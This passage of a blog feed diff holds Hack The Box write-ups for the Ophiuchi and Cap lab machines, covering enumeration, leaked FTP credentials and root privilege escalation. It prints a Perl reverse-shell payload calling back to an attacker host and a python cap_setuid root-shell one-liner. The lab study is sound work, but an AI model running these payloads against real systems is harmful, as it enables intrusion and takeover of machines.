+&lt;h1 id=&quot;privesc&quot;&gt;Privesc&lt;/h1&gt;
+
+&lt;p&gt;It looks like there’s an interesting tool we may execute&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;User admin may run the following commands on ophiuchi:
+    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we can run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.go&lt;/code&gt; program, looking at it, it contains the following interesting lines:&lt;/p&gt;
+
+&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;fmt&quot;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;wasm&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;github.com/wasmerio/wasmer-go/wasmer&quot;&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;os/exec&quot;&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;log&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wasm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;main.wasm&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wasm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NewInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;defer&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;info&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Not ready to deploy&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Ready to deploy&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;deploy.sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;err&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                        &lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fatal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Println&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, it loads a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; file, pulls an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info&lt;/code&gt; exported function from it and executes it, then checks the return value to see if it is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;. If it is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;, it then executes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh deploy.sh&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The good news about the above is that there are no paths specified, meaning that it will pull from the current working directory. So if we can get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info()&lt;/code&gt; to return &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;, we should be good.&lt;/p&gt;
+
+&lt;p&gt;Additionally, in the directory where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.go&lt;/code&gt; is located, there’s a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; file. Lets see if we can just execute using it.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cp /opt/wasm-functions/main.wasm .
+admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Not ready to deploy
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No such luck, it looks like the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; file is not returning &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;We have a few options&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;We can try to craft our own &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wasm&lt;/code&gt; file that exports a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info&lt;/code&gt; function and return &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt; from it&lt;/li&gt;
+  &lt;li&gt;We can try to edit the existing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; file to adjust &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info&lt;/code&gt; to return &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Since I’ve never crafted a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wasm&lt;/code&gt; file before, I opted to go for the second option. It looks like we can disasemble &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wasm&lt;/code&gt; into an editable format using &lt;a href=&quot;https://github.com/webassembly/wabt&quot;&gt;wabt&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/WebAssembly/wabt.git
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;wabt
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git submodule update &lt;span class=&quot;nt&quot;&gt;--init&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;build
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;build
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cmake &lt;span class=&quot;nt&quot;&gt;-DBUILD_TESTS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;OFF .. 
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cmake &lt;span class=&quot;nt&quot;&gt;--build&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After successfully building, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wasm2wat&lt;/code&gt; to decompile the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wasm&lt;/code&gt; file and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wat2wasm&lt;/code&gt; to compile it back into a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wasm&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;scp admin@10.10.10.227:/opt/wasm-functions/main.wasm &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wabt/bin/wasm2wat main.wasm &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; main.wat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wat&lt;/code&gt; file is pretty straightforward&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 0)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export &quot;memory&quot; (memory 0))
+  (export &quot;info&quot; (func $info))
+  (export &quot;__data_end&quot; (global 1))
+  (export &quot;__heap_base&quot; (global 2)))
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With a minor tweak to it, we can change the return value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$info&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 1)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export &quot;memory&quot; (memory 0))
+  (export &quot;info&quot; (func $info))
+  (export &quot;__data_end&quot; (global 1))
+  (export &quot;__heap_base&quot; (global 2)))
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, reassembling the file:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wabt/bin/wat2wasm main.wat &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; main.wasm
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;scp main.wasm admin@10.10.10.227:/tmp/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now that we have the changed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.wasm&lt;/code&gt; ready, lets craft a simple reverse shell payload and execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.go&lt;/code&gt; script.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;deploy.sh 
+&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;use Socket;$i=&quot;10.10.14.204&quot;;$p=83;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&amp;gt;&amp;amp;S&quot;);open(STDOUT,&quot;&amp;gt;&amp;amp;S&quot;);open(STDERR,&quot;&amp;gt;&amp;amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/go run /opt/wasm-functions/index.go
+Ready to deploy
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Catching the reverse shell with a netcat listener:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 83
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 83 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.204] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.227] 36116
+&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Success!! We have root!&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb medium" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Cap Writeup</title><link href="/blog/writeup/htb/htb-cap/" rel="alternate" type="text/html" title="HTB: Cap Writeup" /><published>2021-06-07T15:42:00-07:00</published><updated>2021-06-07T15:42:00-07:00</updated><id>/blog/writeup/htb/htb-cap</id><content type="html" xml:base="/blog/writeup/htb/htb-cap/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+
+&lt;p&gt;I began searching this box with a standard &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo nmap -sC -sV -oA nmap/cap 10.129.121.64
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-06 21:26 EDT
+Nmap scan report for 10.129.121.64
+Host is up (0.091s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    gunicorn
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 135.21 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;foothold&quot;&gt;Foothold&lt;/h1&gt;
+
+&lt;p&gt;From the above scan, there are ports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;21&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;22&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; open, with port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; hosting an HTTP server. Visiting port 80 in a web browser has a web UI which shows various statistics about the web server, including allowing you to download the last 5 minutes of network traffic.&lt;/p&gt;
+
+&lt;p&gt;Looking at the download from this, it can be seen that the download starts at index 1, simply adjusting the download back by an index will give you a PCAP dump at index 0. When viewing this PCAP dump, it may be seen that it’s a recording of an FTP connection with the credentials &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nathan:Buck3tH4TF0RM3!&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Those credentials work to log into the FTP server on the machine, which starts in the nome directory for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nathan&lt;/code&gt;. If you attempt the same FTP credentials via SSH, you’ll see that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nathan&lt;/code&gt; user has the exact same username/password.&lt;/p&gt;
+
+&lt;h1 id=&quot;privesc&quot;&gt;Privesc&lt;/h1&gt;
+
+&lt;p&gt;Once logged into SSH, the privesc portion took me a bit, but you can eventually find that the executable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/python3.8&lt;/code&gt; has the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cap_setuid&lt;/code&gt; capabilities!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;getcap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; / 2&amp;gt;/dev/null
+/usr/bin/python3.8 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_raw+ep
+/usr/bin/traceroute6.iputils &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_raw+ep
+/usr/bin/mtr-packet &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_net_bind_service,cap_net_admin+ep
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;What this means is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3.8&lt;/code&gt; executable has the ability to set the UID of the process, allowing it to run as a different user. You may read more about &lt;a href=&quot;https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/&quot;&gt;Linux Privilege Escalation using Capabilities&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Using the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/python3.8 -c &apos;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&apos;&lt;/code&gt; will instantly spawn a root shell.&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb easy" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">New Blog Who Dis</title><link href="/blog/new-blog-who-dis/" rel="alternate" type="text/html" title="New Blog Who Dis" /><published>2021-06-07T15:15:00-07:00</published><updated>2021-06-07T15:15:00-07:00</updated><id>/blog/new-blog-who-dis</id><content type="html" xml:base="/blog/new-blog-who-dis/">&lt;p&gt;I’d like to welcome you to my blog!!&lt;/p&gt;
 
 &lt;p&gt;This blog is going to serve as my online resource for sharing InfoSec related topics, cooking, tech tips, and various other related material!&lt;/p&gt;
 
